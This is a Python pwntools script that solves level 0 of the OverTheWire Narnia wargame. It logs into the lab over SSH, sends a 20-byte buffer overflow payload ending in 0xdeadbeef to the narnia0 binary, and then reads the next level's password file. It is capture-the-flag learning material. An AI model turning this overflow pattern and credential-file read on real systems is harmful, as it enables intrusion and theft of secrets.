from pwn import *

# Connect to the narnia 0 lab
shell = ssh('narnia0', 'narnia.labs.overthewire.org', password='narnia0', port=2226)
# Ensure that the lab did connect
sh = shell.run('sh')
# Navigating to the narnia directory
sh.sendline(b'cd /narnia')
# Creating the payload for the exploit
payload = b'A' * 20 + b'\xef\xbe\xad\xde'
# Sending the payload to lab0
sh.sendline(b'./narnia0')
# Getting the initial response
resp = sh.clean(timeout = 2)
lines = resp.split(b'\n')
for line in lines:
        print(line)
# Sending the exploit to narnia0
sh.sendline(payload)
resp = sh.clean(timeout = 2)
# Get the response after the payload is sent
lines = resp.split(b'\n')
for line in lines:
        print(line)
# sh.interactive()
sh.sendline(b'cat /etc/narnia_pass/narnia1')
passwd = sh.recvline(timeout = 1)
print(passwd)
shell.close()